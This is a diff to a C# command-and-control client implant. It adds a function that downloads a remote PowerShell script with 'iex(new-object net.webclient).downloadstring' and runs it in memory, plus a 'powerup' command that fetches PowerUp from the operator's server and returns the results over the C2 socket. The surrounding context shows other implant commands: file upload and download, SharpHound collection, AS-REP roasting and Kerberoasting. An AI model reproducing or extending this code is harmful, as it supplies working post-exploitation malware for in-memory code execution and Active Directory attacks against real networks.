@@ -290,6 +290,37 @@ namespace C2Client
 
         }
 
+        public string RunPSScript(string url)
+        {
+            string result = "";
+            RunspaceConfiguration rc = RunspaceConfiguration.Create();
+            Runspace r = RunspaceFactory.CreateRunspace(rc);
+            r.Open();
+
+            string cmd = String.Format(@"iex(new-object net.webclient).downloadstring('{0}')", url) ;
+            StringWriter sw = new StringWriter();
+
+            PowerShell ps =PowerShell.Create();
+            ps.Runspace = r;
+            ps.AddScript(cmd);
+            Console.WriteLine(cmd);
+            Collection<PSObject> po = ps.Invoke();
+
+            //Thread.Sleep(3000);
+
+            foreach(PSObject p in po)
+            {
+                sw.WriteLine(p.ToString());
+            }
+            ps.Stop();
+            r.Close();
+            // Thread.Sleep(4000);
+            result += sw.ToString();
+            Console.WriteLine("---------------result-------");
+            Console.WriteLine(result);
+            return result;
+
+        }
         public StringWriter GetAllMembers(string groupName, string domainName,StringWriter sw)
         {
             
@@ -354,7 +385,7 @@ namespace C2Client
                         uploader.Name = "Uploader to server";
                         uploader.Start();
                         uploader.Join();
-                       // Thread.Sleep(5000);
+                        // Thread.Sleep(5000);
                         /*
                         byte[] filecontents = File.ReadAllBytes(filename);
                         string base64contents = Convert.ToBase64String(filecontents);
@@ -375,7 +406,7 @@ namespace C2Client
                         downloader.Join();
                         //File.WriteAllBytes(@"C:\Windows\Temp\" + file2, contents);
 
-                       // Thread.Sleep(3000);
+                        // Thread.Sleep(3000);
                         cmd = "got file";
 
                     }
@@ -392,7 +423,7 @@ namespace C2Client
                         sharp.Name = "Sharphoundzip";
                         sharp.Start();
                         sharp.Join();
-                       Thread.Sleep(2000);
+                        Thread.Sleep(2000);
 
                     }
                     else if (cmd == "Get-ASREPRoastable")
@@ -403,7 +434,7 @@ namespace C2Client
                         asrep.Start();
                         asrep.Join();
                         Console.WriteLine(cmd);
-                       
+
                     }
                     else if (cmd == "Get-Kerberoastable")
                     {
@@ -437,7 +468,7 @@ namespace C2Client
                             ds.Filter = "(objectclass=group)";
 
                             sw.WriteLine("-----Domain: {0}-----", domainName);
-                            foreach(SearchResult sr in ds.FindAll())
+                            foreach (SearchResult sr in ds.FindAll())
                             {
                                 sw.WriteLine("------{0}------", sr.Properties["samaccountname"][0]);
                                 Thread groups = new Thread(() => { sw = p.GetAllMembers(sr.Properties["samaccountname"][0].ToString(), domainName, sw); });
@@ -447,13 +478,28 @@ namespace C2Client
                             }
 
                         }
-                            
+
                         //Thread groups = new Thread(() => { sw = p.GetAllMembers("Domain Admins", d.Name, sw); });
-                       // groups.Name = "groups";
-                        
+                        // groups.Name = "groups";
+
                         Thread.Sleep(2000);
                         cmd = sw.ToString();
                         Console.WriteLine(cmd);
+
+
+                    }
+
+                    else if (cmd == "powerup")
+                    {
+                        //get powerupps1 and execute in memory
+                        string url = String.Format("http://{0}:{1}/powerup.ps1", args[2], args[3]);
+                        Program p = new Program();
+                        Thread runpsscript = new Thread(() => { cmd = p.RunPSScript(url); });
+                        //cmd = p.RunPSScript(url);
+                        runpsscript.Start();
+                        runpsscript.Join();
+
+                        Thread.Sleep(1000);
 
 
                     }
@@ -470,6 +516,7 @@ namespace C2Client
                     }
                     cs.Send(Encoding.ASCII.GetBytes(cmd));
                     Console.WriteLine("[+] Sent {0}", cmd);
+                    Console.WriteLine(cmd.Length.ToString());
 
                     Array.Clear(buffer, 0, buffer.Length);
                     cs.Receive(buffer);
